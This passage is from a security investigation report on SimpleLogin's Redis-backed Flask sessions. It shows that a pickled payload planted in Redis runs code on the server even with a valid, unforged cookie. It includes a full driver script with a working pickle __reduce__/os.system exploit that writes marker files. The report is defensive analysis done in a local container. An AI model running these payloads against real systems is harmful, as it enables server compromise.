**Reasoning.** `unsign(...)` returns the UUID and never touches the Redis payload; the cookie is **byte-identical** before and after tampering (`cookie BEFORE tamper == cookie AFTER tamper ? True`), proving the signature is over the *pointer* only. The attacker changes bytes the signer does not cover, so the request still passes cookie validation, still points at the poisoned key, and still reaches `pickle.loads` (`app/session.py:76`) &rarr; code execution (marker `ppid=17155`, the server worker).

### R6 — `BadSignature` contrast (condition 4)

Complete driver output. A malicious payload is planted, then the cookie signature is forged by flipping its last character; the `unsign` reproduction runs in a standalone canonical process:

```console
========== R6 CONDITION 4: BadSignature forged-cookie contrast ==========
Valid cookie from a real login: 539e2087-3de9-477a-a39b-b783b4e9e247.2tLcpmAlcf1tz2O0slMdHljD1Mg
Plant malicious payload at session:539e2087-3de9-477a-a39b-b783b4e9e247 (EXISTS=1)
Forge by flipping the last signature char ('g' -> 'A'):
forged = 539e2087-3de9-477a-a39b-b783b4e9e247.2tLcpmAlcf1tz2O0slMdHljD1MA

$ signer.unsign('539e2087-3de9-477a-a39b-b783b4e9e247.2tLcpmAlcf1tz2O0slMdHljD1MA')   # in a standalone canonical process
Traceback (most recent call last):
  File "<string>", line 3, in <module>
  File "/app/venv/lib/python3.10/site-packages/itsdangerous/signer.py", line 169, in unsign
    raise BadSignature("Signature %r does not match" % sig, payload=value)
itsdangerous.exc.BadSignature: Signature b'2tLcpmAlcf1tz2O0slMdHljD1MA' does not match
BEFORE next request: $ test -f /tmp/pwned_c4 -> ABSENT
$ GET /dashboard  (FORGED cookie) -> 302
Location: http://127.0.0.1:7788/auth/login?next=%2Fdashboard%3F
AFTER next request: $ test -f /tmp/pwned_c4 -> ABSENT  (payload never read)
$ redis EXISTS session:539e2087-3de9-477a-a39b-b783b4e9e247 -> 1   (untouched, never loaded)
```

**Reasoning.** A bad signature makes `extract_and_validate_session_id` catch `itsdangerous.BadSignature` and return `None` (`app/session.py:58-59`); `open_session` then returns a fresh session at `app/session.py:70-71` **without ever calling `_redis_r.get`**, so the poisoned payload is never deserialized — the marker stays **ABSENT** and the Redis key is left untouched (`EXISTS -> 1`, never loaded).

**R6 conclusion.** The signature protects **which key is read** (the pointer), **not whether that key's payload is safe** (the pickle). Therefore: forging the ID &rarr; harmless fresh session (payload never read); tampering the payload while reusing a valid cookie &rarr; **code execution**. An attacker who cannot forge the cookie but *can* write to Redis is still a serious threat, because the integrity guarantee simply does not extend to the pickled bytes.

---

## Runtime driver script

The single script below (`obs_driver.py`) is the exact driver used to produce every runtime block in R2/R3/R5/R6. It was copied into the container and run under the canonical venv:

```console
$ docker cp obs_driver.py sl_app:/tmp/obs_driver.py
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && python /tmp/obs_driver.py'
```

Its complete stdout/stderr is reproduced verbatim across the R2/R3/R5/R6 evidence blocks above (each condition's block is a contiguous slice of this one run). The full script:

```python

#!/usr/bin/env python3
"""
Canonical runtime driver for the SimpleLogin Redis-backed Flask session investigation.
Drives the REAL HTTP entry points (login() -> after_login() -> login_user(); /auth/logout)
via requests.Session, manipulates the Redis payload directly, and exercises all 8 named
conditions with before/during/after evidence. Run under the canonical Python 3.10 venv.
"""
import re
import sys
import subprocess
import pickle
import requests
import itsdangerous
from redis import Redis

BASE = "http://127.0.0.1:7788"
SECRET = "secret"            # FLASK_SECRET from tests/test.env (local test value)
EMAIL = "john@wick.com"
PASSWORD = "password"

r = Redis(host="localhost", port=6379)
signer = itsdangerous.Signer(SECRET, salt="session", key_derivation="hmac")

def line(c="-", n=78):
    print(c * n)

def uuid_from_cookie(cookieval):
    """The slapp cookie is '<uuid>.<itsdangerous-sig>'. unsign returns the uuid bytes."""
    return signer.unsign(cookieval).decode()

def slapp(sess):
    return sess.cookies.get("slapp")

def scrape_csrf(html):
    m = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', html)
    if not m:
        m = re.search(r'value="([^"]+)"[^>]*name="csrf_token"', html)
    return m.group(1) if m else None

def redis_report(sid, label=""):
    key = f"session:{sid}"
    exists = r.exists(key)
    ttl = r.ttl(key)
    print(f"$ redis EXISTS {key}  -> {exists}")
    print(f"$ redis TTL    {key}  -> {ttl}")
    raw = r.get(key)
    if raw is not None:
        print(f"raw pickled bytes ({len(raw)} bytes): {raw!r}")
        try:
            data = pickle.loads(raw)
            print(f"decoded keys = {sorted(data.keys())}")
            for k in sorted(data.keys()):
                print(f"    {k} = {data[k]!r}")
        except Exception as e:
            print(f"decode raised: {type(e).__module__}.{type(e).__name__}: {e}")
    else:
        print("raw pickled bytes: <none>")
    return exists, ttl, raw

def reproduce_loads(byte_literal_repr, tag):
    """Run pickle.loads on the exact bytes in a standalone canonical process; print full traceback."""
    code = "import pickle; pickle.loads(%s)" % byte_literal_repr
    print(f"$ python -c \"import pickle; pickle.loads({byte_literal_repr})\"")
    cp = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    sys.stdout.write(cp.stdout)
    sys.stdout.write(cp.stderr)
    print(f"(exit code: {cp.returncode})")

def fresh_login():
    """Perform a real HTTP login; return (session, sid, cookie)."""
    s = requests.Session()
    g = s.get(BASE + "/auth/login", allow_redirects=False)
    csrf = scrape_csrf(g.text)
    p = s.post(BASE + "/auth/login",
               data={"email": EMAIL, "password": PASSWORD, "csrf_token": csrf},
               allow_redirects=False)
    ck = slapp(s)
    sid = uuid_from_cookie(ck)
    return s, sid, ck

print("################## CANONICAL RUNTIME DRIVER ##################")
print("python:", sys.version.split()[0], "| executable:", sys.executable)
print("requests:", requests.__version__, "| itsdangerous:", itsdangerous.__version__)
import redis as _redismod
print("redis-py:", _redismod.__version__)
print()

# =====================================================================
# CONDITION 3 + CONDITION 1 + CONDITION 2  (normal lifecycle, one session)
# =====================================================================
print("========== R2 NORMAL LIFECYCLE (conditions 3 -> 1 -> 2) ==========")
s = requests.Session()

print("\n----- CONDITION 3: unauthenticated GET /auth/login (CSRF-only) -----")
g = s.get(BASE + "/auth/login", allow_redirects=False)
print(f"$ GET /auth/login -> {g.status_code}")
set_cookie_hdrs = g.raw.headers.getlist("Set-Cookie") if hasattr(g.raw.headers, "getlist") else [g.headers.get("Set-Cookie")]
for h in set_cookie_hdrs:
    print("Set-Cookie:", h)
ck0 = slapp(s)
sid0 = uuid_from_cookie(ck0)
print("slapp cookie value :", ck0)
print("session uuid (unsigned):", sid0)
csrf = scrape_csrf(g.text)
print("scraped csrf_token :", csrf)
before3 = redis_report(sid0, "cond3")

print("\n----- CONDITION 1: authenticated POST /auth/login -----")
p = s.post(BASE + "/auth/login",
           data={"email": EMAIL, "password": PASSWORD, "csrf_token": csrf},
           allow_redirects=False)
print(f"$ POST /auth/login -> {p.status_code}")
print("Location:", p.headers.get("Location"))
ck1 = slapp(s)
sid1 = uuid_from_cookie(ck1)
print("slapp cookie value :", ck1)
print("session uuid       :", sid1)
print("session_id changed on login?", sid1 != sid0)
redis_report(sid1, "cond1")
d = s.get(BASE + "/dashboard", allow_redirects=False)
print(f"$ GET /dashboard -> {d.status_code}  (Location: {d.headers.get('Location')})")

print("\n----- CONDITION 2: GET /auth/logout -----")
print(f"BEFORE: authenticated sid={sid1} EXISTS={r.exists('session:'+sid1)}")
lo = s.get(BASE + "/auth/logout", allow_redirects=False)
print(f"$ GET /auth/logout -> {lo.status_code}")
print("Location:", lo.headers.get("Location"))
lo_cookies = lo.raw.headers.getlist("Set-Cookie") if hasattr(lo.raw.headers, "getlist") else [lo.headers.get("Set-Cookie")]
print(f"ALL Set-Cookie headers on logout response ({len(lo_cookies)}):")
for h in lo_cookies:
    print("Set-Cookie:", h)
ck2 = slapp(s)
sid2 = uuid_from_cookie(ck2)
print(f"AFTER: old key session:{sid1} EXISTS={r.exists('session:'+sid1)}  (deleted by purge_session)")
print(f"AFTER: session_id rotated? {sid2 != sid1}  (new id = {sid2})")
redis_report(sid2, "cond2")

# =====================================================================
# CONDITION 5: random / garbage bytes
# =====================================================================
print("\n\n========== R3 CONDITION 5: random/garbage bytes ==========")
s5, sid5, ck5 = fresh_login()
print(f"BEFORE: authenticated login sid={sid5}")
print(f"cookie = {ck5}")
redis_report(sid5, "cond5")
d = s5.get(BASE + "/dashboard", allow_redirects=False)
print(f"$ GET /dashboard -> {d.status_code}  (authenticated)")
garbage = b"\x00\x01\x02not-a-pickle\xff\xfe"
print(f"\nPOISON: overwrite ONLY the Redis payload (valid signed cookie retained)")
print(f">>> r.set('session:{sid5}', {garbage!r})   # {len(garbage)} bytes")
r.set(f"session:{sid5}", garbage)
print("\nDURING: reproduce pickle.loads against the EXACT poisoned bytes (canonical 3.10)")
reproduce_loads(repr(garbage), "cond5")
print("\nAFTER: next request with the SAME valid cookie")
d = s5.get(BASE + "/dashboard", allow_redirects=False)
print(f"$ GET /dashboard -> {d.status_code}")
print("Location:", d.headers.get("Location"))
d2 = s5.get(BASE + "/auth/login", allow_redirects=False)
print(f"$ GET /auth/login -> {d2.status_code}")
ck5b = slapp(s5)
sid5b = uuid_from_cookie(ck5b)
print(f"session_id reset to NEW uuid = {sid5b}   (rotated? {sid5b != sid5})")
print(f"$ redis EXISTS session:{sid5}  -> {r.exists('session:'+sid5)}   (garbage still present)")
print(f"$ redis EXISTS session:{sid5b}  -> {r.exists('session:'+sid5b)}   (new session)")

# =====================================================================
# CONDITION 6: truncated valid pickle
# =====================================================================
print("\n\n========== R3 CONDITION 6: truncated valid pickle ==========")
sample = {"_permanent": True, "_fresh": True, "csrf_token": "deadbeef",
          "_user_id": "e76413ad-9d99-42ae-991a-199a64e10e7a", "sudo_time": 1783488982}
full_pickle = pickle.dumps(sample)
truncated = full_pickle[: len(full_pickle) // 2]
print(f"FULL valid pickle ({len(full_pickle)} bytes): {full_pickle!r}")
print(f"TRUNCATED first half ({len(truncated)} bytes): {truncated!r}")
s6, sid6, ck6 = fresh_login()
print(f"\nBEFORE: authenticated login sid={sid6}")
redis_report(sid6, "cond6")
print(f"\nPOISON:")
print(f">>> r.set('session:{sid6}', {truncated!r})   # {len(truncated)} bytes")
r.set(f"session:{sid6}", truncated)
print("\nDURING: reproduce against the exact truncated bytes (canonical 3.10)")
reproduce_loads(repr(truncated), "cond6")
print("\nAFTER: next request with the SAME valid cookie")
d = s6.get(BASE + "/dashboard", allow_redirects=False)
print(f"$ GET /dashboard -> {d.status_code}  (Location: {d.headers.get('Location')})")
d2 = s6.get(BASE + "/auth/login", allow_redirects=False)
print(f"$ GET /auth/login -> {d2.status_code}")
ck6b = slapp(s6)
sid6b = uuid_from_cookie(ck6b)
print(f"session_id reset to NEW uuid = {sid6b}   (rotated? {sid6b != sid6})")
print(f"old key EXISTS={r.exists('session:'+sid6)} (truncated ignored); new key EXISTS={r.exists('session:'+sid6b)}")

print("\n\n########## DRIVER PART 1 COMPLETE (R2/R3) ##########")

# =====================================================================
# Build the CWE-502 proof-of-construct malicious pickle
# (standard PoC, NOT user-supplied: a class whose __reduce__ calls os.system)
# =====================================================================
import os
print("\n\n########## R5/R6 MALICIOUS PICKLE PROOF-OF-CONSTRUCT ##########")

def make_malicious(marker_path, tag):
    cmd = ('echo "code-exec-during-pickle.loads marker=%s ppid=$PPID epoch=$(date +%%s)" > %s'
           % (tag, marker_path))
    class Exploit:
        def __reduce__(self):
            return (os.system, (cmd,))
    return pickle.dumps(Exploit()), cmd

mal_bytes, mal_cmd = make_malicious("/tmp/pwned_local", "local")
print("PoC class: Exploit.__reduce__ returns (os.system, (cmd,))")
print("cmd =", repr(mal_cmd))
print(f"malicious pickle ({len(mal_bytes)} bytes): {mal_bytes!r}")
print("\nLocal reproduction in a standalone canonical 3.10 process:")
repro = (
    "import pickle, os\n"
    "cmd = %r\n"
    "class Exploit:\n"
    "    def __reduce__(self):\n"
    "        return (os.system, (cmd,))\n"
    "malicious = pickle.dumps(Exploit())\n"
    "rv = pickle.loads(malicious)\n"
    "print('pickle.loads return value:', repr(rv))\n"
    "print('exception raised? no')\n"
    % mal_cmd.replace("/tmp/pwned_local", "/tmp/pwned_localrepro")
)
print("$ python - << 'PY'   # exact code executed via python -c")
sys.stdout.write(repro)
print("PY")
cp = subprocess.run([sys.executable, "-c", repro], capture_output=True, text=True)
sys.stdout.write(cp.stdout); sys.stdout.write(cp.stderr)
mk = subprocess.run(["cat", "/tmp/pwned_localrepro"], capture_output=True, text=True)
print("marker written by local repro:", mk.stdout.strip())

# =====================================================================
# CONDITION 7: well-formed malicious pickle -> server-side code execution
# =====================================================================
print("\n\n========== R5 CONDITION 7: well-formed malicious pickle ==========")
subprocess.run(["rm", "-f", "/tmp/pwned_c7"])
mal7, cmd7 = make_malicious("/tmp/pwned_c7", "cond7")
s7, sid7, ck7 = fresh_login()
print(f"BEFORE: authenticated login sid={sid7}")
print(f"cookie = {ck7}")
b = subprocess.run(["bash", "-lc", "test -f /tmp/pwned_c7 && echo EXISTS || echo ABSENT"], capture_output=True, text=True)
print("$ test -f /tmp/pwned_c7 && echo EXISTS || echo ABSENT ->", b.stdout.strip())
dd = s7.get(BASE + "/dashboard", allow_redirects=False)
print(f"$ GET /dashboard -> {dd.status_code}  (authenticated)")
print(f"\nmalicious pickle ({len(mal7)} bytes): {mal7!r}")
print(f"\nPLANT the malicious pickle at the session key (valid signed cookie retained):")
print(f">>> r.set('session:{sid7}', mal7)   # mal7 = the {len(mal7)}-byte pickle shown immediately above")
r.set(f"session:{sid7}", mal7)
print("\nDURING/AFTER: next request with the SAME valid cookie")
dd = s7.get(BASE + "/dashboard", allow_redirects=False)
print(f"$ GET /dashboard -> {dd.status_code}")
print("Location:", dd.headers.get("Location"))
import time as _t; _t.sleep(0.3)
mk = subprocess.run(["cat", "/tmp/pwned_c7"], capture_output=True, text=True)
print("$ cat /tmp/pwned_c7")
sys.stdout.write(mk.stdout); sys.stdout.write(mk.stderr)

# =====================================================================
# CONDITION 8: tamper-without-forgery
# =====================================================================
print("\n\n========== R6 CONDITION 8: tamper-without-forgery ==========")
subprocess.run(["rm", "-f", "/tmp/pwned_c8"])
mal8, cmd8 = make_malicious("/tmp/pwned_c8", "cond8")
s8, sid8, ck8 = fresh_login()
print(f"A real login yields a legitimately-signed cookie:")
print(f"cookie = {ck8}")
print(f"\nThe signer authenticates ONLY the uuid pointer (canonical 3.10):")
print(f"$ signer.unsign({ck8!r}).decode()")
print("->", signer.unsign(ck8).decode())
cookie_before = slapp(s8)
print(f"\nOverwrite ONLY the Redis payload with the malicious pickle, keep the UNMODIFIED cookie:")
print(f"malicious pickle ({len(mal8)} bytes): {mal8!r}")
print(f">>> r.set('session:{sid8}', mal8)")
r.set(f"session:{sid8}", mal8)
cookie_after = slapp(s8)
print(f"cookie BEFORE tamper == cookie AFTER tamper ? {cookie_before == cookie_after}")
print(f"  (before: {cookie_before})")
print(f"  (after : {cookie_after})")
dd = s8.get(BASE + "/dashboard", allow_redirects=False)
print(f"$ GET /dashboard  (unmodified legit cookie) -> {dd.status_code}")
_t.sleep(0.3)
mk = subprocess.run(["cat", "/tmp/pwned_c8"], capture_output=True, text=True)
print("$ cat /tmp/pwned_c8")
sys.stdout.write(mk.stdout); sys.stdout.write(mk.stderr)

# =====================================================================
# CONDITION 4: BadSignature forged-cookie contrast
# =====================================================================
print("\n\n========== R6 CONDITION 4: BadSignature forged-cookie contrast ==========")
subprocess.run(["rm", "-f", "/tmp/pwned_c4"])
mal4, cmd4 = make_malicious("/tmp/pwned_c4", "cond4")
s4, sid4, ck4 = fresh_login()
print(f"Valid cookie from a real login: {ck4}")
print(f"Plant malicious payload at session:{sid4} (EXISTS={r.exists('session:'+sid4)})")
r.set(f"session:{sid4}", mal4)
# Forge by flipping the last signature char
last = ck4[-1]
flipped = "A" if last != "A" else "B"
forged = ck4[:-1] + flipped
print(f"Forge by flipping the last signature char ('{last}' -> '{flipped}'):")
print(f"forged = {forged}")
print(f"\n$ signer.unsign({forged!r})   # in a standalone canonical process")
repro4 = (
    "import itsdangerous\n"
    "s = itsdangerous.Signer('secret', salt='session', key_derivation='hmac')\n"
    "s.unsign(%r)\n" % forged
)
cp = subprocess.run([sys.executable, "-c", repro4], capture_output=True, text=True)
sys.stdout.write(cp.stdout); sys.stdout.write(cp.stderr)
b = subprocess.run(["bash", "-lc", "test -f /tmp/pwned_c4 && echo EXISTS || echo ABSENT"], capture_output=True, text=True)
print("BEFORE next request: $ test -f /tmp/pwned_c4 ->", b.stdout.strip())
sf = requests.Session()
sf.cookies.set("slapp", forged)
dd = sf.get(BASE + "/dashboard", allow_redirects=False)
print(f"$ GET /dashboard  (FORGED cookie) -> {dd.status_code}")
print("Location:", dd.headers.get("Location"))
_t.sleep(0.3)
b = subprocess.run(["bash", "-lc", "test -f /tmp/pwned_c4 && echo EXISTS || echo ABSENT"], capture_output=True, text=True)
print("AFTER next request: $ test -f /tmp/pwned_c4 ->", b.stdout.strip(), " (payload never read)")
print(f"$ redis EXISTS session:{sid4} -> {r.exists('session:'+sid4)}   (untouched, never loaded)")

print("\n\n########## DRIVER COMPLETE ##########")
```

> The malicious `Exploit.__reduce__` returns `(os.system, (cmd,))`; on the server the command runs in `/bin/sh`, whose `$PPID` is the gunicorn worker (`17155`) — which is why the marker files are stamped `ppid=17155`. A separate `obs_wiring.py` (shown inline in the [Backend wiring](#backend-wiring-how-the-redis-session-store-is-connected-plain-vs-sentinel) section's command) probed the Redis read/write split. Both helpers lived under `/tmp` in the container and were removed afterward (see the Appendix).

---

## Conditions covered (before, during, after)

Every named condition the questions imply was exercised at runtime. State-changing conditions report `before` &rarr; `during/intermediate` &rarr; `after`. All values are from the single canonical run documented above.

| # | Condition | before | during / intermediate | after |
|---|-----------|--------|------------------------|-------|
| 1 | **Happy-path authenticated login** | pre-login CSRF-only session `551174df-…`, keys `['_fresh','_permanent','csrf_token']`, TTL 300 | real `POST /auth/login` &rarr; `login_user()` (`login_utils.py:36`) | `302 → /dashboard/`; **same UUID** (no rotation on login); keys now `['_fresh','_id','_permanent','_user_id','csrf_token','sudo_time']`; TTL 604800; `GET /dashboard` = 200 |
| 2 | **Happy-path logout** | authenticated `551174df-…`, Redis EXISTS=1 | `GET /auth/logout` &rarr; `logout_session()` &rarr; `purge_session` | old key deleted (EXISTS=0); ID rotated to `19a1e7c1-…`; 4 `Set-Cookie` incl. empty `slapp` delete + new rotated `slapp`; new session holds `_flashes=[('success','You are logged out')]`, TTL 300 |
| 3 | **Unauthenticated CSRF-only** | — | `GET /auth/login` (no login) | session holds `['_fresh','_permanent','csrf_token']`; **TTL 300** (`app/session.py:95-96`) |
| 4 | **`BadSignature` forged cookie** | malicious payload planted at `539e2087-…`, marker absent | flip last sig char (`g`&rarr;`A`) &rarr; `unsign` raises `BadSignature` | `302 → /auth/login`; **marker absent**; Redis payload **never read** (`app/session.py:58-59`, `70-71`); key EXISTS=1 |
| 5 | **Random bytes** | authenticated `83c7ce09-…`, TTL 604800, `/dashboard`=200 | `r.set(...,b"\x00\x01\x02not-a-pickle\xff\xfe")` &rarr; `UnpicklingError: invalid load key, '\x00'.` | **silent reset** to `ab61ebcc-…`; `302`, not 500; garbage key still present |
| 6 | **Truncated valid pickle** | authenticated `a72d7b71-…`, TTL 604800 | write first 65 of 131 bytes &rarr; `UnpicklingError: pickle data was truncated` | **silent reset** to `ef4ce277-…`; `302`, not 500 |
| 7 | **Well-formed malicious pickle** | authenticated `f035a177-…`, marker absent | plant 132-byte malicious pickle &rarr; `posix.system` runs **inside** `pickle.loads` (`app/session.py:76`) | **code executed** (marker `ppid=17155`); request `302`, log has no error — indistinguishable from a reset |
| 8 | **Tamper-without-forgery** | real login `0d50e571-…`, valid cookie | overwrite only Redis payload; cookie byte-identical (no MAC); `unsign` returns the UUID | request with **unmodified** legit cookie &rarr; **code executed** (marker `ppid=17155`) |

---

## `open_session` decision logic

In prose: on each request, `open_session` (`app/session.py:68-80`) extracts and validates the session ID from the `slapp` cookie (`extract_and_validate_session_id`, `app/session.py:47-59`). **If the cookie is missing or its signature is invalid** (`BadSignature`), it returns a **fresh** `ServerSession` with a new UUID (`app/session.py:70-71`) and **never touches Redis**. Otherwise it reads `session:<uuid>` from Redis (`app/session.py:73`). **If the value is absent**, it returns a fresh session. **If the value is present**, it calls `pickle.loads(val)` (`app/session.py:76`), and exactly one of three things happens: (a) a **valid benign** pickle &rarr; the stored `dict` is restored into a `ServerSession` (`app/session.py:77`); (b) an **invalid** pickle (random/truncated/corrupt) &rarr; an exception is raised, caught by `except Exception: pass` (`app/session.py:78-79`), and a fresh session is returned (`app/session.py:80`); or (c) a **valid malicious** pickle &rarr; its `__reduce__` executes **during** `loads` (code execution) *before* any `except` can help, because no exception is raised.

```mermaid
flowchart TD
    A[Incoming request with slapp cookie] --> B{Cookie present and signature valid?}
    B -- No / BadSignature --> C[Return fresh ServerSession new uuid<br/>app/session.py:70-71, L80<br/>Redis never read]
    B -- Yes --> D[Read Redis key session:uuid<br/>app/session.py:73]
    D --> E{Value present?}
    E -- No --> C
    E -- Yes --> F[pickle.loads value<br/>app/session.py:76]
    F -- Raises UnpicklingError etc --> G[except Exception: pass<br/>silent reset, no log<br/>app/session.py:78-80]
    F -- Valid benign pickle --> H[Return ServerSession with data<br/>normal session restored]
    F -- Valid MALICIOUS pickle --> I[__reduce__ executes during loads<br/>CODE EXECUTION, not caught]
```

---
## Why pickle-in-Redis is the risk (research rationale)

The runtime observations above are the primary evidence; the following published sources corroborate the *mechanism* and the *signing semantics* (they inform the rationale — every behavioral claim in this document is still grounded in the observed runs above):

- **CVE-2021-33026 (Flask-Caching) — the direct analog.** Flask-Caching used `pickle` for its cache with no message-authentication over the stored bytes, so an actor with write access to the backend (filesystem, Memcached, **Redis**) could plant a payload that runs arbitrary Python during deserialization. Public write-ups note that `pickle.loads` reconstructs objects by invoking `__reduce__`, so a crafted object's callable (e.g., `os.system`) runs at load time, and that exploitation typically requires prior write access to the store — which lowers likelihood but does not eliminate risk in shared or misconfigured environments. This is structurally identical to SimpleLogin's `RedisSessionStore`: a pickle payload in Redis with no MAC over the bytes. Sources: [SentinelOne — CVE-2021-33026](https://www.sentinelone.com/vulnerability-database/cve-2021-33026/), [Miggo — CVE-2021-33026](https://www.miggo.io/vulnerability-database/cve/CVE-2021-33026).
- **Pickle executes during load.** A well-formed malicious pickle does **not** raise; its `__reduce__` callable runs *inside* `pickle.loads`, so a bare `try/except` around `loads` cannot prevent execution — only random/truncated bytes raise (and get caught). This is exactly what R5's marker file demonstrated at runtime (marker written by worker pid `17155`). Sources: [dhound — pickle code execution](https://knowledge.dhound.io/), [chocapikk — pickle RCE write-up](https://chocapikk.com/).
- **`itsdangerous` `Signer` vs `Serializer`.** `Signer` signs **raw bytes only**; `Serializer` wraps a signer to sign *serialized* data. SimpleLogin uses `itsdangerous.Signer` over the session-ID string (`app/session.py:37-41`), which authenticates the ID pointer but **not** the pickled payload — the root of the R6 conclusion. Source: [itsdangerous documentation](https://itsdangerous.palletsprojects.com/).
- **Remediation baseline (rationale only — out of scope for this task).** The standard mitigations are: prefer JSON over pickle for session/cache payloads; if pickle is unavoidable, use a restricted `Unpickler` allowlist and/or MAC the stored payload; and restrict/authenticate Redis network access. Source: [Sourcery — Flask insecure deserialization](https://sourcery.ai/). This task observes and explains the behavior; it does **not** modify or harden the code (per the read-only mandate, AAP §0.5.2).

---

## Dependency versions (observed in the canonical build)

The packages on the session code path, with versions read from the running canonical interpreter (matching the `poetry.lock` pins in AAP §0.6.1):

```console
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && python -c "import importlib.metadata as m,sys;print(\"python:\",sys.version.split()[0]);[print(f\"{p}: {m.version(p)}\") for p in [\"Flask\",\"Flask-Login\",\"itsdangerous\",\"Werkzeug\",\"redis\",\"Flask-Limiter\",\"limits\"]]"'

python: 3.10.18
Flask: 1.1.2
Flask-Login: 0.5.0
itsdangerous: 1.1.0
Werkzeug: 1.0.1
redis: 4.6.0
Flask-Limiter: 1.4
limits: 1.5.1
```

| Package | Observed version | Role on the session path |
|---------|------------------|--------------------------|
| Python | 3.10.18 | Canonical interpreter (`FROM python:3.10`, `pyproject.toml` `python = "^3.10"`) |
| Flask | 1.1.2 | `SessionInterface`; `app.secret_key`, `app.session_cookie_name`, `app.permanent_session_lifetime` |
| Flask-Login | 0.5.0 | `login_user`/`logout_user`; populates `_user_id`, `_fresh`, `_id`; `session_protection="strong"` |
| itsdangerous | 1.1.0 | `Signer` (HMAC) over the session-ID cookie — signs the pointer, not the payload |
| Werkzeug | 1.0.1 | `CallbackDict` used by `ServerSession`; WSGI primitives |
| redis | 4.6.0 | Redis client backing the store (obtained via `limits`) |
| Flask-Limiter | 1.4 | Provides `limits.storage.Redis*Storage` used in `app/redis_services.py` |
| limits | 1.5.1 | Storage abstraction that yields the Redis connection(s) |

The standard-library `pickle` module (`app/session.py:9-12`) is the serializer at the center of the analysis; it ships with the interpreter and is not a third-party dependency. (In the canonical 3.10 build, `import cPickle` fails and the code uses `pickle`; `pickle.DEFAULT_PROTOCOL` is 4 — consistent with the `\x80\x04` prefix on every payload above.)

---

## Coverage pass

Re-reading the question and confirming each named item is answered with a concrete value, a `file:line`, observed evidence, sibling variants, and causal reasoning:

| Requirement / named item | Answered? | Concrete value + `file:line` | Observed evidence |
|--------------------------|-----------|------------------------------|-------------------|
| **R1** How stored bytes become objects (deserialization) | ✅ | `pickle.loads(val)` at `app/session.py:76`, reading `session:<uuid>` (`app/session.py:18,44-45`) | R1 section; decoded payloads in R2 |
| **R2** What normal sessions look like (login/logout) | ✅ | `login_user()` `login_utils.py:36`, `sudo_time` `:37`; keys `_user_id/_fresh/_id/sudo_time/csrf_token`; logout purge+rotate `app/session.py:61-66` | Conditions 1, 2, 3 |
| **R3** Corrupted/malformed — fail, reset, or error? | ✅ | **Silent reset**, no error: `except Exception: pass` `app/session.py:78-79` &rarr; fresh session `:80` | Conditions 5, 6 (302, not 500) |
| **R4** What shows in responses / logs | ✅ | Normal `302`/`200`; **no** log line (no logging call in `except`); `SENTRY_DSN=None` (`server.py:111`) | R4 log window + `grep -c` scan |
| **R5** Boundary: harmless reset vs real risk | ✅ | **reset vs. code execution**; `__reduce__` runs in `pickle.loads` `app/session.py:76` before `except` | Condition 7 (marker `ppid=17155`) |
| **R6** Tamper without forging the signed ID | ✅ | **Yes, risk changes**: `Signer` covers pointer only (`app/session.py:37-41,54-59`), no MAC on payload | Condition 8 (exec) vs Condition 4 (`BadSignature` &rarr; never read) |
| Sibling: unauthenticated CSRF-only branch | ✅ | 300 s TTL, CSRF-only (`app/session.py:95-96`) | Condition 3 |
| Sibling: `BadSignature` cookie path | ✅ | `extract_and_validate_session_id` returns `None` (`app/session.py:58-59`) | Condition 4 |
| Sibling: Redis read/write wiring (plain vs Sentinel) | ✅ | plain: same conn (`redis_services.py:12`); sentinel: master write / slave read (`:17-18`); invalid &rarr; `RuntimeError` (`:22-25`) | [Backend wiring](#backend-wiring-how-the-redis-session-store-is-connected-plain-vs-sentinel) |

**Conditions 1–8** are each exercised with `before`/`during`/`after` in the [Conditions covered](#conditions-covered-before-during-after) table.

---

## Appendix: repository integrity proof

This task is **read-only** with respect to repository source (AAP §0.5.2): the only artifact created is this document. The base commit is `2cd6ee777f8c2d3531559588bcfb18627ffb5d2c`. The diff against the base shows **exactly one added file** — this document — and nothing else:

```console
$ git diff --name-status 2cd6ee777f8c2d3531559588bcfb18627ffb5d2c..HEAD
A	blitzy/documentation/app_2cd6ee777f8c.md
```

Each of the ten reference source files exercised in this investigation is **unchanged** versus the base commit (empty `git diff` per file):

```console
$ for f in app/session.py app/redis_services.py server.py app/config.py app/extensions.py \
           app/auth/views/login.py app/auth/views/login_utils.py app/auth/views/logout.py \
           app/api/views/user_info.py app/log.py; do
    test -z "$(git diff --name-only 2cd6ee77..HEAD -- "$f")" && echo "UNCHANGED: $f" || echo "CHANGED: $f"
  done
UNCHANGED: app/session.py
UNCHANGED: app/redis_services.py
UNCHANGED: server.py
UNCHANGED: app/config.py
UNCHANGED: app/extensions.py
UNCHANGED: app/auth/views/login.py
UNCHANGED: app/auth/views/login_utils.py
UNCHANGED: app/auth/views/logout.py
UNCHANGED: app/api/views/user_info.py
UNCHANGED: app/log.py
```

The working tree is clean after committing the document (no stray temporary files; the observation scripts `obs_driver.py`/`obs_wiring.py` lived only under the container's `/tmp` and were removed, and all planted Redis session keys were deleted):

```console
$ git status --porcelain
(empty)
```
